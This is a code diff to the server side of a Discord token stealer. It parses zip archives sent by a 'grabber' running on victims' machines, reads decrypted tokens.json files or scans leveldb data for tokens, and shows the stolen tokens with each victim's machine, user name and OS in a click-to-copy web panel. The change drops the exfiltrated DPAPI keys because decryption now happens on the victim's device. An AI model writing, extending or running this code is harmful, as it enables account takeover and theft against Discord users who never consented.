@@ -518,44 +518,39 @@ function parseDiscordZip(zipBuf) {
     try { return JSON.parse(me.getData().toString("utf8")); } catch { return {}; }
   })();
 
-  const localState = {};
-  for (const e of entries) {
-    if (e.entryName.includes("Local State")) {
-      try {
-        const ls = JSON.parse(e.getData().toString("utf8"));
-        const enc = ls?.os_crypt?.encrypted_key;
-        if (enc) {
-          const tag = e.entryName.split("/")[0];
-          localState[tag] = enc;
-        }
-      } catch {}
-    }
-  }
-
   const results = [];
   const seen = new Set();
 
+  // First pass: read pre-decrypted tokens.json written by the grabber
   for (const e of entries) {
     const name = e.entryName;
-    if (!name.includes("leveldb/")) continue;
-    if (!/\.(ldb|log|sst)$/.test(name)) continue;
-
+    if (!name.endsWith("/tokens.json")) continue;
     const tag = name.split("/")[0];
-    if (!tag.startsWith("dc")) continue;
-    if (seen.has(tag)) continue;
+    if (!tag.startsWith("dc") || seen.has(tag)) continue;
+    try {
+      const tokens = JSON.parse(e.getData().toString("utf8"));
+      if (Array.isArray(tokens) && tokens.length > 0) {
+        seen.add(tag);
+        results.push({ source: tag, tokens, machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
+      }
+    } catch {}
+  }
 
-    const data = e.getData();
-    const found = scanLDB(data);
+  // Second pass: fallback LDB scan for any tags not already found
+  for (const e of entries) {
+    const name = e.entryName;
+    if (!name.includes("/ldb/")) continue;
+    if (!/\.(ldb|log|sst)$/.test(name)) continue;
+    const tag = name.split("/")[0];
+    if (!tag.startsWith("dc") || seen.has(tag)) continue;
+    const found = scanLDB(e.getData());
     if (found) {
       seen.add(tag);
-      results.push({
-        source: tag,
-        ...found,
-        encKey: localState[tag] || null,
-        machine: meta.m || "",
-        user: meta.u || "",
-        os: meta.o || "",
-      });
+      if (found.encrypted) {
+        results.push({ source: tag, encrypted: true, machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
+      } else {
+        results.push({ source: tag, tokens: [found.token], machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
+      }
     }
   }
 
@@ -574,18 +569,19 @@ app.get("/dc/:id", checkKey, async (req, res) => {
     const cards = results.length ? results.map(r => {
       if (r.encrypted) return `
         <div class="tcard enc">
-          <div class="tc-tag">${esc(r.source)}</div>
+          <div class="tc-tag">${esc(r.source)} &mdash; ENCRYPTED</div>
           <div class="tc-label">STATUS</div>
-          <div class="tc-val red">ENCRYPTED (DPAPI)</div>
-          ${r.encKey ? `<div class="tc-label">ENCRYPTED KEY (base64)</div><div class="tc-val mono small selectable">${esc(r.encKey)}</div>` : ""}
+          <div class="tc-val red">Token encrypted with DPAPI — decryption happens on-device (update grabber)</div>
           <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
         </div>`;
+      const tokenRows = (r.tokens||[]).map(t => `
+          <div class="tc-val mono selectable" onclick="cp(this)" title="click to copy">${esc(t)}</div>`).join("");
       return `
         <div class="tcard">
-          <div class="tc-tag">${esc(r.source)}</div>
+          <div class="tc-tag">${esc(r.source)} &mdash; ${(r.tokens||[]).length} token(s)</div>
           <div class="tc-label">TOKEN</div>
-          <div class="tc-val mono selectable" onclick="cp(this)">${esc(r.token)}</div>
-          <div class="tc-hint">click to copy</div>
+          ${tokenRows}
+          <div class="tc-hint">click token to copy</div>
           <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
           <div class="tc-label">OS</div><div class="tc-val dim">${esc(r.os)}</div>
         </div>`;
